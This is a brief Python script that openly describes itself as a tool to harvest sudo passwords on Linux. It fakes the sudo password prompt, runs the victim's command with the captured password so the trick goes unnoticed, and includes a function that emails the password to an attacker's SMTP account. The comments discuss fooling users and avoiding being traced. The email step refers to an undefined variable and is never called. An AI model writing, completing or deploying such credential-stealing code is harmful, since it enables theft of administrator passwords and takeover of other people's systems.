#/usr/bin/python
# created by protectedbyhackers
# Not to be used for malicious acts
# 
# This python script is to be used to
# harvest sudo passwords on linux system
# then to email the password to a specific email
# 
import argparse
import subprocess
import smtplib
import getpass
import os

# This will retrieve the command that was supposed
# to be sudoed
# known issues: "" are needed around the command
def getCommand():
	parser = argparse.ArgumentParser() # make it default for now
	parser.add_argument("command")
	args = parser.parse_args()
	return args.command # Need to get rid of the need for the " "

# This will provide the sudo interface to get the sudo password
def getSudoPass():
	promptStr = "[sudo] password for "+ getpass.getuser()+ ": "
	password = getpass.getpass(promptStr)
	return password

# In order to truely fool a user
# their intended action must still occur
def emulateSudo(sudoArgs, sudoPassword):
	os.system("echo %s | sudo -S %s" % (sudoPassword, sudoArgs))

# This sends the password via email
# Fill out the emailUser, emailPass, emailAddr,
# emailServ, emailPort 
# to be able to send an email to you
# 
# Known issues: Can easily be traced back to user
# - Need to put all this into subprocess to avoid
# 	any noticable user performance
# - Possibly create own smtp server to send email
#	without showing the username / password
def sendPassword(passid): 
	emailUser = "" # this is your username
	emailPass = "" # this is your password
	emailAddr = "" # this is your email
	emailServ = "" # this is your email server smtp.gmail.com
	emailPort = 587 # port to use, as integer 587

	server = smtplib.SMTP(emailServ, emailPort)
	server.ehlo()
	server.starttls()
	server.ehlo()
	server.login(emailUser, emailPass)
	msg = passid
	server.sendmail(FROM, FROM, msg)
	server.quit()



cmd = getCommand()
sudoPass = getSudoPass()
emulateSudo(cmd, sudoPass)




